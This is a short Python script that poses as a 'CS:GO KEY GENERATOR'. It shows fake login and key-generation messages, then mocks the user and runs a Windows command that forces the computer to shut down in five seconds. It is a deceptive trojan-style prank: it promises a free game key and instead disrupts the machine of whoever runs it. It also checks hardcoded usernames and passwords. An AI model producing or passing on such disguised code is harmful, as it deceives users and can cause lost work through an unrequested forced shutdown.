import time
import os
import sys


print ('Hello!')
time.sleep (1)
#typewritter effect

welcome = 'Welcome to CS:GO KEY GENERATOR by IronProjects\n'
for x in welcome:
    print(x, end="")
    sys.stdout.flush()
    time.sleep (.1)
  
time.sleep (1)
print ('Before moving foward provide ACCOUNT info: ')
time.sleep (2)

#loop in which is limited by a number of attempts, after 3 failed attempts the loop stops
attempts=0
while attempts < 3: #if user input is correct, the script proceeds
    username = input("ID: ")
    password = input("Password: ")
    if (
        username == 'Matr1x' and password == 'jup1ter37' or
        username == 'Olofmeister' and password == 'meisterh4cks'                  
        ):
        time.sleep(2)
        print("Logging in...")
        time.sleep(2)
        print("Logged in succesfully!")
        time.sleep(1)
        print("Checking for updates...")
        time.sleep(1)
        print("System is up to date")
        time.sleep(2)
        print("Generating CS:GO Key")
        time.sleep(4)
        cya = 'If you want some keys, go buy them, btw, while you are reading this message I am making sure your pc shutsdown. Good bye :)'
        for x in cya:
            print(x, end="")
            sys.stdout.flush()
            time.sleep (.2)
        time=5 #shutdown windows computer with a custom timer, in this case, time = 5s to shutdown
        os.system("shutdown /s /t %s " % time)  
        break
    else:
        time.sleep(1)
        attempts+=1
        print("Incorrect, try again.")
        time.sleep(1)
        if attempts==3:
            print("Too many failed attempts, closing...")
            time.sleep(3)
            break
        
